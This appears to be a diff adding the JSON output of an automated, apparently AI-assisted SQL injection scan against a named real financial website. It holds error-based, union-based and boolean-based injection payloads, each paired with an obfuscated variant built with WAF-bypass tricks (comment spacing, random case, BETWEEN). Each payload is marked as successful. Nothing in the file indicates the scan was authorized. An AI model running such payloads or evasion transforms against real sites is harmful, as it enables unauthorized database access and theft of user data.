@@ -1,0 +1,71 @@
+{
+  "target_url": "https://www.finnomena.com",
+  "timestamp": "2025-10-27 13:56:35",
+  "waf_analysis": {
+    "detected_waf": "unknown",
+    "confidence": 50,
+    "recommendation": "使用通用绕过技术",
+    "bypass_techniques": [
+      "space2comment",
+      "randomcase",
+      "between"
+    ]
+  },
+  "test_results": {
+    "tested_payloads": 5,
+    "successful_payloads": 4,
+    "vulnerable_types": [
+      "error_based",
+      "union_based",
+      "boolean_based",
+      "boolean_based"
+    ],
+    "payload_details": [
+      {
+        "payload": "' AND extractvalue(rand(),concat(0x3a,version()))-- ",
+        "enhanced_payload": "'/**/ANd/**/exTractValUe(RanD(),concat(0X3A,version()))--/**/",
+        "type": "error_based",
+        "vulnerable": true,
+        "response_time": 0.6515388488769531,
+        "status_code": 200
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3-- ",
+        "enhanced_payload": "'/**/UNIoN/**/seLecT/**/1,2,3--/**/",
+        "type": "union_based",
+        "vulnerable": true,
+        "response_time": 0.7354118824005127,
+        "status_code": 200
+      },
+      {
+        "payload": "' OR 1=1-- ",
+        "enhanced_payload": "'/**/Or/**/1 BETWEEN 1 AND 1=1--/**/",
+        "type": "boolean_based",
+        "vulnerable": true,
+        "response_time": 1.9893810749053955,
+        "status_code": 200
+      },
+      {
+        "payload": "' AND 1=1-- ",
+        "enhanced_payload": "'/**/AND/**/1 BETWEEN 1 AND 1=1--/**/",
+        "type": "boolean_based",
+        "vulnerable": true,
+        "response_time": 0.6998178958892822,
+        "status_code": 200
+      }
+    ],
+    "waf_bypassed": false,
+    "success_rate": 80.0
+  },
+  "security_analysis": {
+    "risk_level": "medium",
+    "confidence": 50,
+    "vulnerability_analysis": "需要进一步测试",
+    "recommendations": [
+      "实施参数化查询",
+      "部署WAF防护"
+    ],
+    "exploitation_possibility": "medium"
+  },
+  "gemini_enhanced": true
+}
